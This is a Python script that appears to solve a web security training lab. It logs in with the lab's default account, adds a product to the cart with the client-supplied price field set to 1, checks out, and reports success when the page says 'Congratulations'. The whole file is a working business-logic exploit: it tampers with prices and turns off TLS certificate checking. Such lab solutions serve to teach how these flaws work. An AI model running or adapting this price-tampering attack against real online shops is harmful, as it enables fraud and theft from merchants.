import requests
import sys
import urllib3
from utils import get_csrf_token, login

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def buy_item(session: requests.Session, base_url: str) -> None:
    base_url = base_url.rstrip("/")

    # 1) Login
    print("(+) Try to logging in as wiener user...")
    login_url = f"{base_url}/login"
    login(session, login_url, username="wiener", password="peter")
    print("(+) Successfully logged in as wiener.")

    # 2) Add item to cart
    cart_url = f"{base_url}/cart"
    data_cart = {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "1"}
    r = session.post(cart_url, data=data_cart, verify=False)
    r.raise_for_status()

    # 3) Checkout
    checkout_url = f"{base_url}/cart/checkout"
    checkout_csrf_token = get_csrf_token(session, cart_url)
    data_checkout = {"csrf": checkout_csrf_token}

    r = session.post(checkout_url, data=data_checkout, verify=False)
    r.raise_for_status()

    # 4) Check solved condition
    if "Congratulations" in r.text:
        print("(+) Successfully exploited the business logic vulnerability.")
    else:
        print("(-) Could not exploit the business logic vulnerability.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    session = requests.Session()
    buy_item(session, sys.argv[1])

if __name__ == "__main__":
    main()

